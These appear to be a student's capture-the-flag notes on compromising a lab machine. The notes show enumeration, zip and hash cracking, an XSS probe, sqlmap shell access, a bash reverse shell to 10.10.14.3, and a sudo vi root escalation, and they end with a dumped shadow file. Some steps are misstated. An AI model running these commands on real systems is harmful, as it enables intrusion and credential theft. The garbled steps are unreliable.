# Notes
starting ip: 10.10.10.46

## Eumeration
`nmap -sC -sV -oA vaccine_nmap -Pn 10.10.10.46`
`gobuster dir -u http://10.10.10.46/ -w /usr/share/dirb/wordlists/common.txt > gobuster.txt`

Found FTP port using nmap on port 21

can log in to ftp using ftpuser : mc@F1l3ZilL4 which you find from oopsie(the machine before this one) in an xml file

Logged into the ftp server and find a file called backup.zip

`get backup.zip`


## Cracking file
Going to need to crack the password on the file, so `zip2john backup.zip > zip.hash` which gives a hash file

to crack the password on the file use `john zip.hash` and the file will be cracked
`backup.zip:741852963::backup.zip:style.css, index.php:backup.zip` -> output

The password is: 741852963 

## Looking at index.php

```php
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")
```

so the username is password and you need to find the password that equals "2cb42f8734ea607eefed3b70af13bbd3" when md5 hash'd which can be done from the browser

password is: qwerty789

## On Website
http://10.10.10.46/dashboard.php?search='/><script>alert(1)</script> -> shows you there is no sanatization

now want to use sql map to see what you can get

## SQL map

`sqlmap http://10.10.10.46/dashboard.php?search=whatever --cookie="PHPSESSID=pj9mivktap01hq7qg0tev7i1jb"` works so try to get shell

`sqlmap http://10.10.10.46/dashboard.php?search=whatever --cookie="PHPSESSID=pj9mivktap01hq7qg0tev7i1jb" --os-shell` -> gets shell

## Get reverse shell
start `nc -lvnp 9001`

ifconfig tun0 to get ip

in the sqlmap shell type the following to get shell `bash -c 'bash -i >& /dev/tcp/<ip>/9001 0>&1'` bash -c 'bash -i >& /dev/tcp/10.10.14.3/9001 0>&1'

got shell

`export TERM=xterm`

## When in shell
`cd /var/www/html && cat dashboard.php`

find this in dashboard.php for postgreSQL `$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");`

## Connect with ssh

`ssh <ip>@postgres` and password is P@s5w0rd!

`sudo -l` and use password

find you can execute a file as sudo with vi

`sudo !/bin/bash -P` for root

`cd /root` and get flag: dd6e058e814260bc70e9bbdef2715849

## After flags

`cat /etc/shadow` -> found this (all the passwords)-> `root:$6$mJFt2hPm87QQnTTe$iQR6I/fnw56HY7KABpVORJ4uabDHfWILJLAj0PTswex.epHHMhcRAoR08J3MrHPYu3SFd67DoUdaLSFYxwE4/1:18296:0:99999:7:::
daemon:*:18186:0:99999:7:::
bin:*:18186:0:99999:7:::
sys:*:18186:0:99999:7:::
sync:*:18186:0:99999:7:::
games:*:18186:0:99999:7:::
man:*:18186:0:99999:7:::
lp:*:18186:0:99999:7:::
mail:*:18186:0:99999:7:::
news:*:18186:0:99999:7:::
uucp:*:18186:0:99999:7:::
proxy:*:18186:0:99999:7:::
www-data:*:18186:0:99999:7:::
backup:*:18186:0:99999:7:::
list:*:18186:0:99999:7:::
irc:*:18186:0:99999:7:::
gnats:*:18186:0:99999:7:::
nobody:*:18186:0:99999:7:::
systemd-timesync:*:18186:0:99999:7:::
systemd-network:*:18186:0:99999:7:::
systemd-resolve:*:18186:0:99999:7:::
messagebus:*:18186:0:99999:7:::
syslog:*:18186:0:99999:7:::
_apt:*:18186:0:99999:7:::
uuidd:*:18186:0:99999:7:::
tcpdump:*:18186:0:99999:7:::
landscape:*:18186:0:99999:7:::
pollinate:*:18186:0:99999:7:::
sshd:*:18295:0:99999:7:::
systemd-coredump:!!:18295::::::
simon:$6$HmDDB89I3xFM2mJe$DNf5vRLvByV6U4VND/p2VfYYX8/s5apU3j3gk/2Y7A6Q8adNfDKHBFhw71i1gJ7kRUO7rqFX90h3sp4O6K1p20:18295:0:99999:7:::
lxd:!:18295::::::
postgres:$6$mbGAgq2J4ZtuYuWl$9GBi2iuMl6Io6GaxOtiWcbpg2CM6QxWNgSexoc97osVx3TQFv6SEld/339z0fyrgDxQBQxbUQDa6PkVeahpO3.:18296:0:99999:7:::
ftp:*:18295:0:99999:7:::
ftpuser:$6$vbS2lINzTKdW.wYi$1Xxvomaxm3u.su5B0IompTFJJS8Ax1V0bgYRDBjgwick/d6WITZzq44MXeFbKl8RmsF3TzyN/ey9clfhW8iE0/:18295:0:99999:7::: `